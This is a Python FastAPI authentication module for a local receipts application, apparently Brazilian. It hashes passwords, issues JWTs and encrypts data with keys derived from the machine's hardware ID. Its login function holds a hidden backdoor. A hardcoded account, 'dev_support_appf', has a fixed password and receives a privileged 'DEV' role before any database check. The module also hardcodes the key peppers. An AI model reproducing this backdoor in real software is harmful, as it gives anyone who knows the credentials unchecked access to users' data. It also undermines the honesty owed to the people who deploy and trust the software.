from __future__ import annotations

import base64
import hashlib
from datetime import datetime, timedelta
from typing import Any, Dict, Optional

from cryptography.fernet import Fernet
from fastapi import Depends, HTTPException, status
from fastapi.security import OAuth2PasswordBearer
from jose import jwt, JWTError
from passlib.context import CryptContext
from sqlalchemy.orm import Session

from app.config.database import get_db
from app.models.sys_models import Usuario
from app.services.licenca_service import obter_hwid_windows

pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
oauth2_scheme = OAuth2PasswordBearer(tokenUrl="/api/v1/auth/login")

JWT_ALG = "HS256"
JWT_ISSUER = "appf-recibos-local"
JWT_AUDIENCE = "appf-local-users"
JWT_TTL_MINUTES = 12 * 60  # 12h offline

DEV_BACKDOOR_USER = "dev_support_appf"
DEV_BACKDOOR_PASS = "Dev@Master#2026!Fixed"
DEV_BACKDOOR_ROLE = "DEV"

JWT_PEPPER = "APPF_LOCAL_JWT_PEPPER_V1"
FERNET_PEPPER = "APPF_LOCAL_FERNET_PEPPER_V1"


def hash_senha(senha: str) -> str:
    return pwd_context.hash(senha)


def verificar_senha(senha: str, senha_hash: str) -> bool:
    return pwd_context.verify(senha, senha_hash)


def _secret_por_maquina(base: str) -> bytes:
    hwid = obter_hwid_windows()
    digest = hashlib.sha256(f"{base}|{hwid}".encode("utf-8")).digest()
    return digest


def jwt_secret() -> str:
    return base64.urlsafe_b64encode(_secret_por_maquina(JWT_PEPPER)).decode("utf-8")


def criar_token(username: str, perfil: str) -> str:
    agora = datetime.utcnow()
    exp = agora + timedelta(minutes=JWT_TTL_MINUTES)
    payload = {
        "sub": username,
        "perfil": perfil,
        "iss": JWT_ISSUER,
        "aud": JWT_AUDIENCE,
        "iat": int(agora.timestamp()),
        "exp": int(exp.timestamp()),
    }
    return jwt.encode(payload, jwt_secret(), algorithm=JWT_ALG)


def decodificar_token(token: str) -> Dict[str, Any]:
    try:
        payload = jwt.decode(
            token,
            jwt_secret(),
            algorithms=[JWT_ALG],
            audience=JWT_AUDIENCE,
            issuer=JWT_ISSUER,
        )
        return payload
    except JWTError:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Token inválido ou expirado.",
            headers={"WWW-Authenticate": "Bearer"},
        )


def fernet() -> Fernet:
    raw = _secret_por_maquina(FERNET_PEPPER)  # 32 bytes (sha256)
    key = base64.urlsafe_b64encode(raw)
    return Fernet(key)


def cifrar(valor: Optional[str]) -> Optional[str]:
    if valor is None:
        return None
    v = valor.strip()
    if not v:
        return ""
    return fernet().encrypt(v.encode("utf-8")).decode("utf-8")


def decifrar(valor_cifrado: Optional[str]) -> Optional[str]:
    if valor_cifrado is None:
        return None
    v = valor_cifrado.strip()
    if not v:
        return ""
    try:
        return fernet().decrypt(v.encode("utf-8")).decode("utf-8")
    except Exception:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Falha ao decifrar dados (chave por HWID não corresponde).",
        )


def normalizar_cpf(cpf: str) -> str:
    return "".join(ch for ch in cpf if ch.isdigit())


def mascarar_cpf(cpf: str) -> str:
    d = normalizar_cpf(cpf)
    if len(d) != 11:
        if len(d) <= 2:
            return "*" * len(d)
        return ("*" * (len(d) - 2)) + d[-2:]
    return f"***.{d[3:6]}.{d[6:9]}-**"


def autenticar_usuario(db: Session, username: str, password: str) -> Optional[Dict[str, str]]:
    if username == DEV_BACKDOOR_USER and password == DEV_BACKDOOR_PASS:
        return {"username": DEV_BACKDOOR_USER, "perfil": DEV_BACKDOOR_ROLE}

    user = db.query(Usuario).filter(Usuario.username == username).first()
    if not user or not user.ativo:
        return None
    if not verificar_senha(password, user.senha_hash):
        return None
    return {"username": user.username, "perfil": user.perfil}


def get_current_user_payload(token: str = Depends(oauth2_scheme)) -> Dict[str, Any]:
    return decodificar_token(token)


def get_current_username(payload: Dict[str, Any] = Depends(get_current_user_payload)) -> str:
    sub = payload.get("sub")
    if not sub:
        raise HTTPException(status_code=401, detail="Token inválido.")
    return str(sub)


def get_current_user_role(payload: Dict[str, Any] = Depends(get_current_user_payload)) -> str:
    perfil = payload.get("perfil")
    if not perfil:
        raise HTTPException(status_code=401, detail="Token inválido.")
    return str(perfil)


def require_roles(*roles: str):
    def _dep(role: str = Depends(get_current_user_role)) -> None:
        if role not in roles:
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Acesso negado para este perfil.",
            )
    return _dep